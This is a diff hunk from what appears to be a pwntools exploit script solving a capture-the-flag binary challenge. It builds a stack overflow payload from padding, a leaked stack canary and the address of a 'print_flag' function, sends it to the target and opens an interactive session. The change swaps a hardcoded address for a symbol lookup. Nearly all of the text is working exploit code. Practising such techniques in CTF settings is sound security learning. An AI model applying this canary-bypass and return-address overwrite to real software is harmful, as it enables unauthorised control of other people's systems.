@@ -27,7 +27,7 @@ win = exe.symbols['print_flag']
 
 # log.info(hex(win)) 0x401236
 
-payload = b'a' * 72 + p64(canary) + (b'a' * 8) + p64(0x401236) # 0xb1ad72a09d9d4500
+payload = b'a' * 72 + p64(canary) + (b'a' * 8) + p64(win) # 0xb1ad72a09d9d4500
 r.sendline(payload)
 r.recvline()
 r.interactive()
